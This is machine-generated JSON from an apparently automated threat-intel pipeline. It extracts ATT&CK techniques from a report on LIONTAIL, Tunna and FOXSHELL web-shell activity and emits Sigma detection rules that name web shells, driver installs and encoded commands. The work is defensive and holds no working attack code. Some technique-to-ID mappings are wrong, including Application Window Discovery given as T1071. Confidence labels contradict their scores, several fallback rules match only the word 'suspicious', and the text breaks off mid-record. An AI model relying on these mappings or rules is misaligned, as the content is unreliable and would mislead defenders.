{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 23,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
        "extracted_ttps": [
          {
            "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "Use of Tunna web shell to tunnel TCP communication over HTTP, allowing connection to remote services",
            "confidence_score": 0.746,
            "confidence_level": "very_low",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Tunna web shell",
              "HTTP tunneling"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "Sc",
              "SystemInfo",
              "ping",
              "shellcode",
              "Tunna",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker uses custom web shells, custom DLL backdoors, and driver-based implants to attack Windows servers, which requires user execution to install the malware",
            "confidence_score": 0.708,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.492,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "custom web shells",
              "custom DLL backdoors",
              "driver-based implants"
            ],
            "tools": [
              "sc.exe",
              "net",
              "LIONTAIL framework",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The attackers utilized web shells to gain initial access to the targeted systems, specifically using a modified version of the Xsl Exec Shell.",
            "confidence_score": 0.707,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.484,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Xsl Exec Shell",
              "FOXSHELL",
              "~/1.aspx"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "ping",
              "shellcode",
              "FOXSHELL",
              "apt",
              "reg",
              "base64",
              "Xsl Exec Shell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The attackers used obfuscation techniques, including class and method obfuscation and string encryption (XOR with one byte), to hide their malicious activities.",
            "confidence_score": 0.705,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.513,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "XOR encryption",
              "obfuscated files"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "Custom obfuscation tools",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f9227fe2-f59c-4033-8d9e-29b3d2a9d57e",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The attackers likely used file and directory discovery techniques to navigate the targeted systems, as indicated by the presence of specific file paths like ~/1.aspx.",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.5,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "~/1.aspx"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "Custom tools",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fae131c4-58e5-45c2-ad8c-6d46478d8197",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The attacker uses the LIONTAIL framework to extract payloads from incoming HTTP traffic, which may involve discovering application windows",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HTTP.sys driver",
              "LIONTAIL framework"
            ],
            "tools": [
              "sc.exe",
              "net",
              "LIONTAIL framework",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5471bc8b-f8b5-4c6c-9fdb-894aad8f6259",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses the LIONTAIL framework, which may involve using command and scripting interpreters to execute malicious commands",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd",
              "at"
            ],
            "tools": [
              "sc.exe",
              "net",
              "LIONTAIL framework",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fa11248e-69c8-4eb1-b0a3-28d567e5a449",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The attacker uses the LIONTAIL framework to exfiltrate data, which may involve using exfiltration over command and control channels",
            "confidence_score": 0.688,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "LIONTAIL framework"
            ],
            "tools": [
              "sc.exe",
              "net",
              "LIONTAIL framework",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5061b68a-60c3-455e-9ff1-2435b0cfd9cd",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attacker uses the LIONTAIL framework to gather system information, which may involve using system information discovery techniques",
            "confidence_score": 0.684,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "SystemInfo"
            ],
            "tools": [
              "sc.exe",
              "net",
              "LIONTAIL framework",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e3be7350-f8b8-4e65-97b2-95d6c78f1f8c",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Potential execution of malicious commands or code through the Tunna web shell",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "web shell",
              "command execution"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "Tunna web shell",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7de8a42f-0139-4641-8954-39efe94fc0cb",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Software Deployment Tools",
            "attack_id": "T1072",
            "tactic": "Execution",
            "description": "Utilization of open-source-based web-deployed proxies and custom-written components for malware deployment",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Tunna web shell",
              "HTTP communication"
            ],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "ping",
              "web shell",
              "shellcode",
              "Tunna",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ba747b93-e3a9-4577-8d34-d53bf5a756f2",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b694386e-8977-48fe-8c34-6100e65766ac",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "57eef378-bcad-4d5e-a7bc-a49c8353cf17",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8d9bea1c-8c8f-498a-9729-af6f50d0c00f",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "37766031-9a09-4ccb-bd77-ade121f4a395",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b2854f9a-69fa-43e7-a1a9-a9cf7f03abff",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f41d1c9b-a34e-44f7-950c-a546ee21a22b",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c73cfa9a-bbfe-4edd-81ae-33853b5ded0a",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8ec3f6e6-1c80-4d0d-a2ec-ce5fad0b066e",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "54243782-93ba-4ecb-8691-0e4830f78731",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8a21cfa5-17d0-4cca-8c7c-b89cea31b864",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "36fbb28b-6c78-44e8-85e5-d75f17872ae6",
            "report_id": "pdf-ea3d556edbc6e1e4d4de6b1b31997334",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc.exe",
              "net",
              "obfuscator",
              "cmd",
              "xor",
              "at",
              "SystemInfo",
              "Sc",
              "shellcode",
              "ping",
              "apt",
              "reg",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Detection: Proxy",
        "description": "Use of Tunna web shell to tunnel TCP communication over HTTP, allowing connection to remote services",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "fallback",
        "id": "2a7c1038-f19a-44be-bc73-504944d332eb",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "User Execution of Custom Web Shells, DLL Backdoors, or Driver Implants",
        "description": "Detects execution of common system binaries (rundll32.exe, powershell.exe, sc.exe, cscript.exe) with command lines indicating custom web shells, DLL backdoors, or driver\u2011based implants, which require user execution to install malicious components.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "dll_execution": {
            "Image|endswith": "\\\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "powershell_webshell": {
            "Image|endswith": "\\\\powershell.exe",
            "CommandLine|contains": "webshell"
          },
          "driver_install": {
            "Image|endswith": "\\\\sc.exe",
            "CommandLine|contains": ".sys"
          },
          "cscript_webshell": {
            "Image|endswith": "\\\\cscript.exe",
            "CommandLine|contains": ".wsf"
          },
          "condition": "dll_execution or powershell_webshell or driver_install or cscript_webshell"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe to run system DLLs (e.g., rundll32.exe shell32.dll,Control_RunDLL)",
          "Administrative scripts that invoke PowerShell with the word \"webshell\" as a variable or comment",
          "Valid driver installations performed by administrators using sc.exe or pnputil.exe",
          "Automation tasks that execute cscript.exe with .wsf files for legitimate Windows scripting"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1204"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "dbd6adf8-efa0-42f5-aeac-1e9dfd51734e",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Exploit Public-Facing Application via Xsl Exec Shell and FOXSHELL Web Shell",
        "description": "Detects execution of a modified Xsl Exec Shell (msxsl.exe) with command lines indicative of FOXSHELL web shell activity or reference to ~/1.aspx, suggesting exploitation of a public-facing application.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\msxsl.exe",
            "CommandLine|contains": [
              "FOXSHELL",
              "1.aspx"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate use of msxsl.exe with scripts containing the strings FOXSHELL or 1.aspx, though such usage is uncommon."
        ],
        "level": "high",
        "tags": [
          "attack.t1190"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "cf08cb32-13ae-4433-989c-45bed61c6875",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Detection: Obfuscated Files or Information",
        "description": "The attackers used obfuscation techniques, including class and method obfuscation and string encryption (XOR with one byte), to hide their malicious activities.",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "fallback",
        "id": "079b1951-e2a1-4b5c-bf55-e9c180cc6fdc",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Web Server Process Performing File Discovery",
        "description": "Detects file and directory discovery commands executed from web server processes with non-interactive user context",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": [
              "dir",
              "ls",
              "Get-ChildItem",
              "find",
              "~/1.aspx"
            ]
          },
          "selection_2": {
            "ParentImage|endswith": [
              "\\w3wp.exe",
              "\\inetinfo.exe",
              "\\csc.exe"
            ]
          },
          "selection_3": {
            "User|startswith": [
              "NT AUTHORITY\\SYSTEM",
              "IIS APPPOOL"
            ]
          },
          "condition": "selection and selection_2 and selection_3"
        },
        "falsepositives": [
          "Legitimate web administration scripts",
          "Automated deployment systems interacting with web content"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.t1083"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "602afb2e-641c-432f-8b12-b59e95703fe8",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Detection: Application Window Discovery",
        "description": "The attacker uses the LIONTAIL framework to extract payloads from incoming HTTP traffic, which may involve discovering application windows",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "fallback",
        "id": "80e755a5-b68d-4c25-8fa7-02c111cc67ca",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Detection: Command and Scripting Interpreter",
        "description": "The attacker uses the LIONTAIL framework, which may involve using command and scripting interpreters to execute malicious commands",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "fallback",
        "id": "29832b84-6093-45f6-8d1f-84016ff74918",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Exfiltration Over Command and Control Channel \u2013 Liontail Execution",
        "description": "Detects execution of the Liontail framework which may be used to exfiltrate data over C2 channels. Looks for liontail.exe launched by common shells, command lines containing 'liontail', or obfuscated invocations.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_process": {
            "Image|endswith": "\\\\liontail.exe",
            "ParentImage|endswith": [
              "\\\\powershell.exe",
              "\\\\cmd.exe",
              "\\\\wscript.exe"
            ]
          },
          "selection_cmd": {
            "CommandLine|contains": "liontail"
          },
          "selection_obfusc": {
            "CommandLine|re": "(?i)liontail.*(-enc|-EncodedCommand)"
          },
          "condition": "selection_process or selection_cmd or selection_obfusc"
        },
        "falsepositives": [
          "Legitimate administrative tools or scripts that are named liontail.exe",
          "Security testing frameworks that include the word \"liontail\" in their command lines",
          "PowerShell or cmd scripts that reference liontail as part of a benign operation"
        ],
        "level": "medium",
        "tags": [
          "attack.t1041",
          "attack.exfiltration",
          "attack.liontail",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Command and Control Channel",
        "generation_method": "langchain",
        "id": "00f61d5c-f6cb-40f1-97d0-24a2134ecffa",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "System Information Discovery via LIONTAIL Framework",
        "description": "Detects system information discovery using the LIONTAIL framework",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "EventID": "1",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine|contains": [
              "SystemInfo",
              "Get-WmiObject"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "PowerShell scripts used for automation"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1057"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "c86cd384-4447-44bb-966d-24886ec8ed48",
        "siem_verification": {
          "detected": true,
          "status": "success",
